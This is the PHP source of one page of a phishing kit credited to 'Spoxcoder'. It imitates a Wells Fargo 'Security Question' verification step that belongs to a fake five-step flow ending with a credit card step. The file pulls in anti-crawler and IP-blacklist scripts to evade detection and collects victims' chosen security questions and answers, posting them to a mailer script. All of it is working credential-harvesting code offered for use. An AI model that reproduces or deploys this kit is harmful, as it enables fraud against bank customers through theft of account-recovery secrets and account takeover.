<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
@require "Spox/Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}


?>
<html class="ui-mobile wf-myriadpro-n4-active wf-active" lang="en"><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<title>Wells Fargo - Verification - Security Question</title>



<link rel="stylesheet" href="Spox/Files/css/jquery.mobile.css?v=19.10.00">
<link rel="stylesheet" href="Spox/Files/css/normalize.css">
<link rel="stylesheet" href="Spox/Files/css/Wells-Fargo-LIVE-Div.css"> 
<link rel="stylesheet" href="Spox/Files/css/ClientPage.css">
	
<link rel="stylesheet" href="Spox/Files/css/desktop-tablet.combined.css?v=19.10.00">
		<!--[if lt IE 9]>
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/medium-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/large-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/ie.css?v=19.10.00" />
			<link rel="stylesheet" href="https://apply.wellsfargo.com/css/ie-print.css?v=19.10.00" media="print" />
		<![endif]-->
	
	

<!--  load the sync tealium  -->

<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style><style type="text/css">@font-face{font-family:myriad-pro;src:url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-l.woff2) format("woff2"),url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-d.woff) format("woff"),url() format("opentype");font-weight:400;font-style:normal;}</style>
<!-- myriad font loaded  -->

</head>
<body class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">

	<style type="text/css">
		.help-block.form-error{
			    color: #dc3545!important;
				    width:10px;
				    display:block;
				    white-space:nowrap;
						}
	</style>

	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage" tabindex="0" style="">

<header role="banner">
	<div class="masthead">
		<nav role="presentation">
					<a class="c28cLink child-window ui-link" aria-label="Wells Fargo" href="#"> <img class="masthead-img-logo" alt="Wells Fargo" role="img" src="Spox/Files/img/lol1.svg">
					</a>
		</nav>

				<div role="navigation" class="top-search">
					<ul>

								<li class="security">
									<a class="c28cLink child-window ui-link" href="#" data-platform="salesplatform">Online Security<span class="ui-hidden-accessible">, opens in a new window</span>
									</a>
								</li>

					</ul>
				</div>

	</div>
</header>

		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
					<div class="progress-small small-screen">
					
	        	    	<span class="right">
		        	    	Step 2 of 5
	    	    		</span>
			    	</div>
  
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
								            		
					            		<li class="ui-block-a active first">
							                	<span class="ui-hidden-accessible">Current Step</span>
							            	<span><span>Security Question</span></span>
							            </li>						            
	            		
					            		<li class="ui-block-b">
							            	<span><span>Email verification</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-c">
							        	    							            	
							            	<span><span>Contact information</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-d">
							        	    							            	
							            	<span><span>Credit card</span></span>
							            </li>						            

					            				            		
					            		<li class="ui-block-e">
							        	    							            	
							            	<span><span>Review</span></span>
							            </li>						            
					            
					</ul>      
			</div>		

				<br>
<div class="section">

		<form id="yourInfoCommand" class="wait" action="Spox/Mail/Mail2.php" method="POST">

			<h2 class="section-hdr">
				Security Question
			</h2>

	<div class="ui-field-contain">

		<label for="employmentStatusJt">
			Question1
		</label>
			<select id="employmentStatusJt" name="Question1" class="required" aria-required="true" data-role="none" ng-model="jointApplicantInfo.employmentInfo.occupation">
			<option value="">Select one</option>
<option name="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option name="what celebrity do you most resemble?">what celebrity do you most resemble?</option>
<option name="what is the name of your favorite charity?">what is the name of your favorite charity?</option>
<option name="what is the name of your first babysitter?">what is the name of your first babysitter?</option>
<option name="what is the name of your first employer?">what is the name of your first employer?</option>
<option name="What is your best friend\&#39;s first name?">What is your best friend\&#39;s first name?</option>

			</select>
<style type="text/css">
	.ui-mobile input, .ui-mobile select, .ui-mobile textarea, .ui-mobile button, .ui-mobile .ui-btn, .ui-btn {
			    line-height: 2.3;

	}
</style>	

<div class="ui-field-contain margin-bot-0">
		<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="emailAddressJt" name="answer1" class="required EMAIL" data-validation="length" data-validation-error-msg="Please answer the first question" data-validation-length="min2" size="43" placeholder=" Answer1" >
</div>
	</div>


<div class="ui-field-contain">

		<label for="employmentStatusJt">
			Question2
		</label>
		<select id="employmentStatusJt" name="Question2" class="required" >
			<option value="">
				Select one
			</option>
<option name="In what city was your high school?">In what city was your high school?</option>
<option name="In what city was your mother born?">In what city was your mother born?</option>
<option name="What was your high school mascot?">What was your high school mascot?</option>
<option name="In what city did you honeymoon?">In what city did you honeymoon?</option>
<option name="what your Favorite person in history?">what your Favorite person in history?</option>
<option name="In what city were you married?">In what city were you married?</option>
			
		</select>


<div class="ui-field-contain margin-bot-0">

				<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="emailAddressJt" name="answer2" class="required EMAIL" data-validation="length" data-validation-error-msg="Please answer the second question" data-validation-length="min2" size="43" placeholder=" Answer2" >


</div>
	</div>


<div class="ui-field-contain">

		<label for="employmentStatusJt">
			Question3
		</label>
		<select id="employmentStatusJt" name="Question3" class="required" >
			<option value="">
				Select one
			</option>
<option name="In what city were you living at age 16?">In what city were you living at age 16?</option>
<option name="What is your mother&#39;s middle name?">What is your mother&#39;s middle name?</option>
<option name="What is your father&#39;s middle name?">What is your father&#39;s middle name?</option>
<option name="In what city was your mother born?">In what city was your mother born?</option>
<option name="In what city were you born?">In what city were you born?</option>
			
		</select>


<div class="ui-field-contain margin-bot-0">

		<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="emailAddressJt" name="answer3" class="required EMAIL" data-validation="length" data-validation-error-msg="Please answer the third question" data-validation-length="min2" size="43" placeholder=" Answer3" >


</div>
	</div>


<div class="btn-ctr">
	<div class="btn-ctr-inner">
	
<button type="submit" name="submit" class="continue-button ui-btn ui-btn-p">
				Continue
			</button>
		
	
</div>
</form>

</div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
</script>

<br>
<div style="display: none;" id="cancelPopup-placeholder"><!-- placeholder for cancelPopup --></div>

</div>

</div>
<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="#" data-platform="salesplatform">Online Security</a></li>

					
					</ul>				
					<ul class="large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="#" href="#" data-platform="salesplatform">Online Security</a></li>

					</ul>				
				</nav>
				<hr>
				© 1999 - <span class="placeholder">2020</span> Wells Fargo. All rights reserved. NMLSR ID 399801
			</div>
		</footer>
</div>

<div style="display: none;"><!-- placeholder --></div>
<div style="display: none;"><!-- placeholder --></div></div></div></div>

</div></div>
<div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;">
</div>
<div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;">
	
</div>
<div id="nuance-chat-anchored" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999999;" aria-live="polite"><div>
<style>
 .wf-FAB-aval { 
     cursor: pointer;
     border: 1px solid #ffffff;
     border-radius: 50%; 
     background: #AE1E23; 
     box-shadow: 3px 3px 3px 0 rgba(0,0,0,.15);
     height: 56px;
     width: 56px;
     padding: 0;
 } 

 .wf-FAB-aval svg {
     display: block;
     margin: 5px auto 0 auto;  
 } 
 html .page {
    overflow: visible;
}
</style></div></div><div id="nuance-chat-anchored-2" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999988;"></div></body>
</html>